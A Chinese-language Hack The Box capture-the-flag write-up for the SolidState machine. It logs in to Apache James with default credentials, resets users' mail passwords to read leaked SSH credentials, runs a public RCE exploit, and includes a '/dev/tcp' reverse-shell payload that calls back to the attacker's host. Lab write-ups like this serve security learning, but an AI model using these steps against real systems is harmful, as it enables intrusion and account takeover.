# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 探测

开放端口
```
┌──(root㉿ss)-[~/htb/SolidState]
└─# nmap -p- --open --min-rate=1000 10.10.10.51 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 10:59 EDT
Nmap scan report for 10.10.10.51
Host is up (0.0039s latency).
Not shown: 64351 closed tcp ports (reset), 1178 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip

Nmap done: 1 IP address (1 host up) scanned in 16.29 seconds

```

详细端口信息
```
┌──(root㉿ss)-[~/htb/SolidState]
└─# nmap -sV -Pn -A -O 10.10.10.51 -p 22,25,80,110,119,4555
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 11:00 EDT
Stats: 0:01:40 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Nmap scan report for 10.10.10.51
Host is up (0.0081s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.10 [10.10.14.10]), PIPELINING, ENHANCEDSTATUSCODES
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3    JAMES pop3d 2.3.2
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
119/tcp  open  nntp    JAMES nntpd (posting ok)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.92%I=7%D=5/30%Time=6294DC0C%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\nPl
SF:ease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPasswo
SF:rd:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 4.8 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   2.97 ms 10.10.14.1
2   3.58 ms 10.10.10.51

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 246.85 seconds

```


# web

```
┌──(root㉿ss)-[~/htb/SolidState]
└─# python3 /root/dirsearch/dirsearch.py -e* -u http://10.10.10.51                                                                         

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.51/_22-05-30_11-02-56.txt

Error Log: /root/dirsearch/logs/errors-22-05-30_11-02-56.log

Target: http://10.10.10.51/

[11:02:56] Starting: 
[11:03:02] 200 -   17KB - /LICENSE.txt                                      
[11:03:03] 200 -  963B  - /README.txt                                       
[11:03:14] 200 -    7KB - /about.html                                       
[11:03:39] 200 -    1KB - /assets/                                          
[11:03:39] 301 -  311B  - /assets  ->  http://10.10.10.51/assets/              
[11:04:18] 200 -    2KB - /images/                                          
[11:04:18] 301 -  311B  - /images  ->  http://10.10.10.51/images/           
[11:04:19] 200 -    8KB - /index.html                                       

```

# 4555

nma结果显示4555端口需要一个登陆的东西


使用默认账号：```root：root```成功登陆

```
┌──(root💀kali)-[~/htb/SolidState]
└─# nc -v 10.10.10.51 4555
10.10.10.51 [10.10.10.51] 4555 (?) open
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection

```

列出所有用户名
```
┌──(root💀kali)-[~/htb/SolidState]
└─# nc -v 10.10.10.51 4555                                                                                                                                                             130 ⨯
10.10.10.51 [10.10.10.51] 4555 (?) open
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
listusers
Existing accounts 7
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
```


修改john的密码
```
┌──(root💀kali)-[~/htb/SolidState]
└─# nc -v 10.10.10.51 4555
10.10.10.51 [10.10.10.51] 4555 (?) open
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
setpassword thomas 123456
Password for thomas reset
setpassword john 123456
Password for john reset

```


登陆john的邮箱，有一封信件
```
┌──(root💀kali)-[~/htb/SolidState]
└─# telnet 10.10.10.51 110                                                                                               1 ⨯
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user john
+OK
pass 123456
+OK Welcome john
list
+OK 1 743
1 743
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.

```

看来mindy的邮箱会有登录信息

修改mindy的邮箱密码，登录，有两封邮件
```
+OK Welcome mindy
list
+OK 2 1945
1 1109
2 836
```


第一封
```
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
```


第二封，暴露出了登录信息
```
retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

```

ssh登录，拿到foothold
```
┌──(root💀kali)-[~/htb/SolidState]
└─# ssh mindy@10.10.10.51                                                                                                                                                              255 ⨯
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$ whoami
-rbash: whoami: command not found

```

拿到user.txt
```
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt
07f110ad2ba2....

```


由上可知，我们当前是一个限制的rbash shell

```
mindy@solidstate:~$ echo $PATH
/home/mindy/bin
```

可以使用的命令只有3个
```
mindy@solidstate:~$ ls /home/mindy/bin
cat  env  ls

```

# rbash 逃逸

查看4555这个服务，貌似存在RCE

```
┌──(root💀kali)-[~/htb]
└─# searchsploit JAMES Remote 2.3.2               

------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit)       | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                                       | linux/remote/35513.py
Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)             | linux/remote/50347.py
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

使用50347.py

```
┌──(root💀kali)-[~/htb/SolidState]
└─# python3 50347.py 10.10.10.51 10.10.16.4 443               
[+]Payload Selected (see script for more options):  /bin/bash -i >& /dev/tcp/10.10.16.4/443 0>&1
[+]Example netcat listener syntax to use after successful execution: nc -lvnp 443
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).
[+]Don't forget to start a listener on port 443 before logging in!

```

现在我们监听本地端口443，只要ssh登录一下就能触发反弹

拿到反弹shell
```
┌──(root💀kali)-[~/htb/SolidState]
└─# nc -lnvp 443                                                                                                                    130 ⨯
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.51] 48296
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
whoami
mindy
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ 

```


# 提权


/usr/share/mime/application/x-vnc.xml


/usr/share/gutenprint/5.2/xml/printers.xml


/home/mindy/.gnupg/pubring.kbx



${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ netstat -ano
netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0     13 10.10.10.51:48296       10.10.16.4:443          ESTABLISHED on (1.68/0/0)
tcp        0      0 10.10.10.51:22          10.10.16.4:54044        ESTABLISHED keepalive (6438.41/0/0)



ssh -N -R 10.10.16.4:631:127.0.0.1:631 root@10.10.16.4